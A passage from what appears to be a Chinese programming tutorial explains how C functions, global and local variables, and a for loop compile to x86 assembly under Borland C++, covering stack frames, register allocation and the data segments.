class="built_in">ptr</span>[<span class="built_in">ebp</span>+<span class="number">8</span>]   -----------(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">add</span>             <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">ebp</span>+<span class="number">12</span>]  -----------(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">pop</span>             <span class="built_in">ebp</span>                    -----------(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">ret</span>             ----------------------------------(<span class="number">6</span>)</span><br><span class="line">_AddNum         endp</span><br></pre></td></tr></table></figure>

<p>ebp 寄存器的值在 (1) 中入栈，在 (5) 中出栈，这主要是为了把函数中用到的 ebp 寄存器的内容，恢复到函数调用前的状态。<br>(2) 中把负责管理栈地址的 esp 寄存器的值赋值到了 ebp 寄存器中。这是因为，在 mov 指令中方括号内的参数，是不允许指定 esp 寄存器的。因此，这里就采用了不直接通过 esp，而是用 ebp 寄存器来读写栈内容的方法。<br>(3) 使用<code>[ebp + 8]</code>指定栈中存储的第 1 个参数 123，并将其读出到 eax 寄存器中。像这样，不使用 pop 指令，也可以参照栈的内容。而之所以从多个寄存器中选择了 eax 寄存器，是因为 eax 是负责运算的累加寄存器。<br>通过 (4) 的 add 指令，把当前 eax 寄存器的值同第 2 个参数相加后的结果存储在 eax 寄存器中。<code>[ebp + 12]</code>是用来指定第 2 个参数 456 的。在 C 语言中，函数的返回值必须通过 eax 寄存器返回，这也是规定。也就是<strong>函数的参数是通过栈来传递，返回值是通过寄存器返回的。</strong><br>(6) 中 ret 指令运行后，函数返回目的地内存地址会自动出栈，据此，程序流程就会跳转返回到 (6)（<code>Call _AddNum</code>）的下一行。这时，AddNum 函数入口和出口处栈的状态变化，就如下图所示：</p>
<figure class="image-box">
                <img src="45.png" alt title class>
                <p></p>
            </figure>

<h2 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h2><p>在熟悉了汇编语言后，接下来我们来了解一下全局变量和局部变量，在函数外部定义的变量称为<strong>全局变量</strong>，在函数内部定义的变量称为<strong>局部变量</strong>，全局变量可以在任意函数中使用，局部变量只能在函数定义局部变量的内部使用。下面，我们就通过汇编语言来看一下全局变量和局部变量的不同之处。</p>
<p>下面定义的 C 语言代码分别定义了局部变量和全局变量，并且给各变量进行了赋值，我们先看一下源代码部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义被初始化的全局变量</span></span><br><span class="line"><span class="keyword">int</span> a1 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> a2 = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> a3 = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> a4 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> a5 = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义没有初始化的全局变量</span></span><br><span class="line"><span class="keyword">int</span> b1,b2,b3,b4,b5;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 定义局部变量</span></span><br><span class="line">  <span class="keyword">int</span> c1,c2,c3,c4,c5,c6,c7,c8,c9,c10;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 给局部变量赋值</span></span><br><span class="line">  c1 = <span class="number">1</span>;</span><br><span class="line">  c2 = <span class="number">2</span>;</span><br><span class="line">  c3 = <span class="number">3</span>;</span><br><span class="line">  c4 = <span class="number">4</span>;</span><br><span class="line">  c5 = <span class="number">5</span>;</span><br><span class="line">  c6 = <span class="number">6</span>;</span><br><span class="line">  c7 = <span class="number">7</span>;</span><br><span class="line">  c8 = <span class="number">8</span>;</span><br><span class="line">  c9 = <span class="number">9</span>;</span><br><span class="line">  c10 = <span class="number">10</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 把局部变量赋值给全局变量</span></span><br><span class="line">  a1 = c1;</span><br><span class="line">  a2 = c2;</span><br><span class="line">  a3 = c3;</span><br><span class="line">  a4 = c4;</span><br><span class="line">  a5 = c5;</span><br><span class="line">  b1 = c6;</span><br><span class="line">  b2 = c7;</span><br><span class="line">  b3 = c8;</span><br><span class="line">  b4 = c9;</span><br><span class="line">  b5 = c10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码挺暴力的，不过没关系，能够便于我们分析其汇编源码就好，我们用 Borland C++ 编译后的汇编代码如下，编译完成后的源码比较长，这里我们只拿出来一部分作为分析使用（我们改变了一下段定义顺序，删除了部分注释）。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">_DATA <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'DATA'</span></span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _a1 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">dd</span> <span class="number">1</span></span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _a2 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">dd</span> <span class="number">2</span></span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _a3 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">dd</span> <span class="number">3</span></span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _a4 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">dd</span> <span class="number">4</span></span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _a5 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">dd</span> <span class="number">5</span></span><br><span class="line">_DATA ends</span><br><span class="line"></span><br><span class="line">_BSS <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'BSS'</span></span><br><span class="line"> <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _b1 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">db</span> <span class="number">4</span> dup(?)</span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _b2 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">db</span> <span class="number">4</span> dup(?)</span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _b3 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">db</span> <span class="number">4</span> dup(?)</span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _b4 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">db</span> <span class="number">4</span> dup(?)</span><br><span class="line">   <span class="meta">align</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">  _b5 label</span> <span class="built_in">dword</span></span><br><span class="line">            <span class="built_in">db</span> <span class="number">4</span> dup(?)</span><br><span class="line">_BSS ends</span><br><span class="line"></span><br><span class="line">_TEXT <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_MyFunc proc <span class="built_in">near</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">push</span>      <span class="built_in">ebp</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"> <span class="keyword">add</span>       <span class="built_in">esp</span>,-<span class="number">20</span></span><br><span class="line"> <span class="keyword">push</span>      <span class="built_in">ebx</span></span><br><span class="line"> <span class="keyword">push</span>      <span class="built_in">esi</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">edx</span>,<span class="number">2</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">ecx</span>,<span class="number">3</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">ebx</span>,<span class="number">4</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">esi</span>,<span class="number">5</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">6</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="number">7</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">12</span>],<span class="number">8</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">16</span>],<span class="number">9</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="number">10</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_a1],<span class="built_in">eax</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_a2],<span class="built_in">edx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_a3],<span class="built_in">ecx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_a4],<span class="built_in">ebx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_a5],<span class="built_in">esi</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_b1],<span class="built_in">eax</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_b2],<span class="built_in">edx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">12</span>]</span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_b3],<span class="built_in">ecx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">16</span>]</span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_b4],<span class="built_in">eax</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20</span>]</span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [_b5],<span class="built_in">edx</span></span><br><span class="line"> <span class="keyword">pop</span>       <span class="built_in">esi</span></span><br><span class="line"> <span class="keyword">pop</span>       <span class="built_in">ebx</span></span><br><span class="line"> <span class="keyword">mov</span>       <span class="built_in">esp</span>,<span class="built_in">ebp</span></span><br><span class="line"> <span class="keyword">pop</span>       <span class="built_in">ebp</span></span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"> </span><br><span class="line">_MyFunc   endp</span><br><span class="line">_TEXT   ends</span><br></pre></td></tr></table></figure>

<p>编译后的程序，会被归类到名为段定义的组。</p>
<ul>
<li><p>初始化的全局变量，会汇总到名为 _DATA 的段定义中</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_DATA <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'DATA'</span></span><br><span class="line">...</span><br><span class="line">_DATA ends</span><br></pre></td></tr></table></figure>
</li>
<li><p>没有初始化的全局变量，会汇总到名为 _BSS 的段定义中</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_BSS <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'BSS'</span></span><br><span class="line"> ...</span><br><span class="line">_BSS ends</span><br></pre></td></tr></table></figure>
</li>
<li><p>被段定义 _TEXT 围起来的汇编代码则是 Borland C++ 的定义</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_TEXT <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="meta">use32</span> <span class="string">'CODE'</span></span><br><span class="line">_MyFunc proc <span class="built_in">near</span></span><br><span class="line">...</span><br><span class="line">_MyFunc   endp</span><br><span class="line">_TEXT   ends</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>我们在分析上面汇编代码之前，先来认识一下更多的汇编指令，此表是对上面部分操作码及其功能的接续：</p>
<table>
<thead>
<tr>
<th>操作码</th>
<th>操作数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>add</td>
<td>A,B</td>
<td>把 A 和 B 的值相加，并把结果赋值给 A</td>
</tr>
<tr>
<td>call</td>
<td>A</td>
<td>调用函数 A</td>
</tr>
<tr>
<td>cmp</td>
<td>A,B</td>
<td>对 A 和 B 进行比较，比较结果会自动存入标志寄存器中</td>
</tr>
<tr>
<td>inc</td>
<td>A</td>
<td>对 A 的值 + 1</td>
</tr>
<tr>
<td>ige</td>
<td>标签名</td>
<td>和 cmp 命令组合使用。跳转到标签行</td>
</tr>
<tr>
<td>jl</td>
<td>标签名</td>
<td>和 cmp 命令组合使用。跳转到标签行</td>
</tr>
<tr>
<td>jle</td>
<td>标签名</td>
<td>和 cmp 命令组合使用。跳转到标签行</td>
</tr>
<tr>
<td>jmp</td>
<td>标签名</td>
<td>和 cmp 命令组合使用。跳转到标签行</td>
</tr>
<tr>
<td>mov</td>
<td>A,B</td>
<td>把 B 的值赋给 A</td>
</tr>
<tr>
<td>pop</td>
<td>A</td>
<td>从栈中读取数值并存入 A</td>
</tr>
<tr>
<td>push</td>
<td>A</td>
<td>把 A 的值存入栈中</td>
</tr>
<tr>
<td>ret</td>
<td>无</td>
<td>将处理返回到调用源</td>
</tr>
<tr>
<td>xor</td>
<td>A,B</td>
<td>A 和 B 的位进行亦或比较，并将结果存入 A 中</td>
</tr>
</tbody></table>
<p>我们首先来看一下 _DATA 段定义的内容。<code>_a1 label dword</code>定义了 _a1 这个标签。标签表示的是相对于段定义起始位置的位置。由于 _a1 在 _DATA 段定义的开头位置，所以相对位置是 0。_a1 就相当于是全局变量 a1。编译后的函数名和变量名前面会加一个（<code>_</code>），这也是 Borland C++ 的规定。<code>dd 1</code>指的是，申请分配了 4 字节的内存空间，存储着 1 这个初始值。dd 指的是 define double word 表示有两个长度为 2 的字节领域（word），也就是 4 字节的意思。<br>Borland C++ 中，由于 int 类型的长度是 4 字节，因此汇编器就把<code>int a1 = 1</code>变换成了<code>_a1 label dword</code>和<code>dd 1</code>。同样，这里也定义了相当于全局变量的 a2 - a5 的标签 _a2 - _a5，它们各自的初始值 2 - 5 也被存储在各自的 4 字节中。<br>接下来，我们来说一说 _BSS 段定义的内容。这里定义了相当于全局变量 b1 - b5 的标签 _b1 - _b5。其中的<code>db 4dup(?)</code>表示的是申请分配了 4 字节的领域，但值尚未确定（这里用 ? 来表示）的意思。db(define byte) 表示有 1 个长度是 1 字节的内存空间。因而，<code>db 4 dup(?)</code>的情况下，就是 4 字节的内存空间。</p>
<blockquote>
<p>注意：<code>db 4 dup(?)</code>不要和<code>dd 4</code>混淆了，前者表示的是 4 个长度是 1 字节的内存空间。而<code>db 4</code>表示的则是双字节（= 4 字节）的内存空间中存储的值是 4。</p>
</blockquote>
<h2 id="临时确保局部变量使用的内存空间"><a href="#临时确保局部变量使用的内存空间" class="headerlink" title="临时确保局部变量使用的内存空间"></a>临时确保局部变量使用的内存空间</h2><p>我们知道，局部变量是临时保存在寄存器和栈中的。函数内部利用栈进行局部变量的存储，函数调用完成后，局部变量值被销毁，但是寄存器可能用于其他目的。所以，<strong>局部变量只是函数在处理期间临时存储在寄存器和栈中的。</strong></p>
<p>回想一下上述代码是不是定义了 10 个局部变量？这是为了表示存储局部变量的不仅仅是栈，还有寄存器。为了确保 c1 - c10 所需的域，寄存器空闲的时候就会使用寄存器，寄存器空间不足的时候就会使用栈。<br>让我们继续来分析上面代码的内容。_TEXT 段定义表示的是 MyFunc 函数的范围。在 MyFunc 函数中定义的局部变量所需要的内存领域。会被尽可能的分配在寄存器中。大家可能认为使用高性能的寄存器来替代普通的内存是一种资源浪费，但是编译器不这么认为，只要寄存器有空间，编译器就会使用它。由于寄存器的访问速度远高于内存，所以直接访问寄存器能够高效的处理。局部变量使用寄存器，是 Borland C++ 编译器最优化的运行结果。<br>代码清单中的如下内容表示的是向寄存器中分配局部变量的部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>       <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">edx</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">ecx</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">ebx</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">esi</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>仅仅对局部变量进行定义是不够的，只有在给局部变量赋值时，才会被分配到寄存器的内存区域。上述代码相当于就是给 5 个局部变量 c1 - c5 分别赋值为 1 - 5。eax、edx、ecx、ebx、esi 是 x86 系列 32 位 CPU 寄存器的名称。至于使用哪个寄存器，是由编译器来决定的。</p>
<p>x86 系列 CPU 拥有的寄存器中，程序可以操作的是十几，其中空闲的最多会有几个。因而，局部变量超过寄存器数量的时候，可分配的寄存器就不够用了，这种情况下，编译器就会把栈派上用场，用来存储剩余的局部变量。</p>
<p>在上述代码这一部分，给局部变量 c1 - c5 分配完寄存器后，可用的寄存器数量就不足了。于是，剩下的 5 个局部变量c6 - c10 就被分配给了栈的内存空间。如下面代码所示：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">6</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="number">7</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">12</span>],<span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">16</span>],<span class="number">9</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>函数入口<code>add esp,-20</code>指的是，对栈数据存储位置的 esp 寄存器（栈指针）的值做减 20 的处理。为了确保内存变量 c6 - c10 在栈中，就需要保留 5 个 int 类型的局部变量（4 字节 * 5 = 20 字节）所需的空间。<code>mov ebp,esp</code>这行指令表示的意思是将 esp 寄存器的值赋值到 ebp 寄存器。之所以需要这么处理，是为了通过在函数出口处<code>mov esp ebp</code>这一处理，把 esp 寄存器的值还原到原始状态，从而对申请分配的栈空间进行释放，这时栈中用到的局部变量就消失了。这也是栈的清理处理。在使用寄存器的情况下，局部变量则会在寄存器被用于其他用途时自动消失，如下图所示：</p>
<figure class="image-box">
                <img src="46.png" alt title class>
                <p></p>
            </figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">6</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="number">7</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">12</span>],<span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">16</span>],<span class="number">9</span></span><br><span class="line"><span class="keyword">mov</span>       <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>这五行代码是往栈空间代入数值的部分，由于在向栈申请内存空间前，借助了<code>mov ebp, esp</code>这个处理，esp 寄存器的值被保存到了 esp 寄存器中，因此，通过使用<code>[ebp - 4]</code>、<code>[ebp - 8]</code>、<code>[ebp - 12]</code>、<code>[ebp - 16]</code>、<code>[ebp - 20]</code>这样的形式，就可以申请分配 20 字节的栈内存空间切分成 5 个长度为 4 字节的空间来使用。例如，<code>mov dword ptr [ebp-4],6</code>表示的就是，从申请分配的内存空间的下端（ebp 寄存器指示的位置）开始向前 4 字节的地址（<code>[ebp - 4]</code>）中，存储着 6 这一 4 字节数据。</p>
<figure class="image-box">
                <img src="47.png" alt title class>
                <p></p>
            </figure>

<h2 id="循环控制语句的处理"><a href="#循环控制语句的处理" class="headerlink" title="循环控制语句的处理"></a>循环控制语句的处理</h2><p>上面说的都是顺序流程，那么现在就让我们分析一下循环流程的处理，看一下 for 循环以及 if 条件分支等 c 语言程序的流程控制是如何实现的，我们还是以代码以及编译后的结果为例，看一下程序控制流程的处理过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义 MySub 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySub</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 不做任何处理</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MyFunc 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Myfunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">    <span class="comment">// 重复调用MySub十次</span></span><br><span class="line">    MySub();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码将局部变量 i 作为循环条件，循环调用十次 MySub 函数，下面是它主要的汇编代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">xor</span>         <span class="built_in">ebx</span>, <span class="built_in">ebx</span>    <span class="comment">; 将寄存器清 0</span></span><br><span class="line">@<span class="number">4</span>  <span class="keyword">call</span>        _MySub          <span class="comment">; 调用 MySub 函数</span></span><br><span class="line">        <span class="keyword">inc</span>         <span class="built_in">ebx</span>         <span class="comment">; ebx 寄存器的值 + 1</span></span><br><span class="line">        <span class="keyword">cmp</span>         <span class="built_in">ebx</span>,<span class="number">10</span>      <span class="comment">;   将 ebx 寄存器的值和 10 进行比较</span></span><br><span class="line">        <span class="keyword">jl</span>          short @<span class="number">4</span>    <span class="comment">; 如果小于 10 就跳转到 @4</span></span><br></pre></td></tr></table></figure>

<p>C 语言中的 for 语句是通过在括号中指定循环计数器的初始值（<code>i = 0</code>）、循环的继续条件（<code>i &lt; 10</code>）、循环计数器的更新（<code>i++</code>）这三种形式来进行循环处理的。与此相对的汇编代码就是通过比较指令（cmp）和跳转指令（jl）来实现的。</p>
<p>下面我们来对上述代码进行说明：<br>MyFunc 函数中用到的局部变量只有 i ，变量 i 申请分配了 ebx 寄存器的内存空间。for 语句括号中的<code>i = 0</code>被转换为 <code>xor ebx,ebx</code>这一处理，xor 指令会对左起第一个操作数和右起第二个操作数进行 XOR 运算，然后把结果存储在第一个操作数中。由于这里把第一个操作数和第二个操作数都指定为了 ebx，因此就变成了对相同数值的 XOR 运算。也就是说不管当前寄存器的值是什么，最终的结果都是 0。类似的，我们使用<code>mov ebx,0</code>也能得到相同的结果，但是 xor 指令的处理速度更快，而且编译器也会启动最优化功能。</p>
<blockquote>
<p>XOR 指的就是异或操作，它的运算规则是 如果 a、b 两个值不相同，则异或结果为 1。如果 a、b 两个值相同，异或结果为 0。<br>相同数值进行 XOR 运算，运算结果为 0。XOR 的运算规则是，值不同时结果为 1，值相同时结果为 0。例如 01010101 和 01010101 进行运算，就会分别对各个数字位进行 XOR 运算。因为每个数字位都相同，所以运算结果为 0。</p>
</blockquote>
<p>ebx 寄存器的值初始化后，会通过 call 指定调用 _MySub 函数，从 _MySub 函数返回后，会执行<code>inc ebx</code>指令，对 ebx 的值进行 + 1 操作，这个操作就相当于<code>i++</code>的意思，++ 表示的就是当前数值 + 1。</p>
<blockquote>
<p>这里需要知道<code>i++</code>和<code>++i</code>的区别：<br><code>i++</code>是先赋值，复制完成后再对 i 执行 + 1 操作。<br><code>++i</code>是先进行 +1 操作，完成后再进行赋值。</p>
</blockquote>
